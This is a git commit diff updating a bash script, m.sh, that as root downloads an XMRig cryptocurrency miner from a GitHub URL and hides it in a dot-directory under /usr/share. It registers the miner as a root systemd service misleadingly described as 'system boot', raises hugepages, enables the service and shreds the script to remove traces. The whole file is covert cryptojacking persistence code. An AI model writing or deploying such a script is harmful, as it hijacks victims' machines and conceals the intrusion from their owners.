60235f57525845b3c934a2b0507b67bd56db1ac8
ardx2 <168349420+ardx2@users.noreply.github.com>
2024-04-28 18:14:02 +0000

    Update m.sh

--- m.sh
+++ m.sh
@@ -1,47 +1,43 @@
 #!/bin/bash
-if [[ $EUID -eq 0 ]]
-then
-   dircheck="/usr/share/.logstxt"
-   filcheck="/etc/systemd/systemd/xmrig.service"
-   filename="$0"
-   exits () {
-    
-    if [[ -d "$dircheck" ]]
-    then
-       rm -r ${dircheck}
+
+if [[ $EUID -eq 0 ]]; then
+    dircheck="/usr/share/.logstxt"
+    filcheck="/etc/systemd/system/xmrig.service"
+    filename="$0"
+
+    exits() {
+        if [[ -d "$dircheck" ]]; then
+            rm -r "${dircheck}"
+        fi
+
+        if [[ -f "$filcheck" ]]; then
+            rm "${filcheck}"
+        fi
+    }
+
+    exits
+
+    if curl -L --progress-bar "https://raw.githubusercontent.com/ardx2/1/main/xmrig.tar.gz" -o xmrig.tar.gz; then
+        touch xmrig.service
+        chmod 777 xmrig config.json
+        chmod 644 xmrig.service
+        mkdir -p "${dircheck}"
+        mv xmrig config.json "${dircheck}/"
+        mv xmrig.service /etc/systemd/system/
+
+        threads=$(lscpu -p | grep -c "^[0-9]")
+        tf=$(printf %.f "$((25 * $threads))e-2")
+        append=$(echo -e "[Unit]\nDescription=system boot\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=1200\nUser=root\nExecStart=/usr/share/.logstxt/xmrig -c /usr/share/.logstxt/config.json --threads=${tf}\nRemainAfterExit=yes\nKillMode=process\n\n[Install]\nWantedBy=multi-user.target" >/etc/systemd/system/xmrig.service)
+
+        echo "vm.nr_hugepages=1280" >>/etc/sysctl.conf
+        sysctl --quiet --system
+        systemctl daemon-reload
+        systemctl enable --now xmrig --quiet
+
+        shred -u "${filename}"
+    else
+        echo "Failed to download xmrig.tar.gz"
     fi
-    
-    if [[ -f "$filcheck" ]]
-    then
-       rm ${filcheck}
-    fi
-   }
-   exits
-   
-  if ! curl -s -O --progress-bar "https://raw.githubusercontent.com/ardx2/1/main/xmrig.tar.gz"
-   touch xmrig.service
-   per=$(chmod 777 xmrig config.json && chmod 644 xmrig.service)
-   dir=$(mkdir /usr/share/.logstxt)
-   move=$(mv xmrig config.json /usr/share/.logstxt/ && mv xmrig.service /etc/systemd/system/)
-   
-   threads=$(lscpu -p | grep -c "^[0-9]") 
-   tf=$(printf %.f "$((25 * $threads))e-2")
-   append=$(echo -e "[Unit]\nDescription=system boot\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=1200\nUser=root\nExecStart=/usr/share/.logstxt/xmrig -c /usr/share/.logstxt/config.json --      threads=$tf\nRemainAfterExit=yes\nKillMode=process\n\n[Install]\nWantedBy=multi-user.target">/etc/systemd/system/xmrig.service)
-   sys=$(echo "vm.nr_hugepages=1280">>/etc/sysctl.conf)
-   system=$(sysctl --quiet --system && systemctl daemon-reload && systemctl enable --now xmrig --quiet)
-   
-   $files
-   $per
-   $dir
-   $move
-   $append
-   $sys
-   $system
-    
-   if [[ $? -eq 0 ]]
-   then 
-      shred -u ${filename}
-   fi
 else
-   echo "Please Run as root!"
+    echo "Please Run as root!"
 fi
